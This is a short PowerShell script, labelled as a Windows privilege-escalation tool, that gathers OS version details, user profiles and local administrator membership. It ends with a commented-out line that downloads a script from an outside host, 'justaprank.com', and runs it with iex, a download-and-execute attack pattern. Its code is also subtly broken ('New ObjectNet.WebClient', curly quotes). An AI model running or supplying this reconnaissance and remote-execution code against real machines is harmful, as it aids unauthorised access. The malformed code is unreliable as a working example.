# A Windows Privilege Escalation!
#This does...
#   + OS and Version Checks
#   + List User Privileges
#   + Lists all users

systeminfo | findstr /B /C:"OS Name" /C:"OS Version" ### OS name and version
Get-ChildItem C:\Users -Force | Select-Object Name ### Lists all user profiles on machine.
net localgroup administrators ### Lists all administrator groups

# Loads PS Script into a variable (Will use later...)
<# $url = ‘https://www.justaprank.com/scripts/script1.ps1′
iex ((New ObjectNet.WebClient).DownloadString($url))
#>
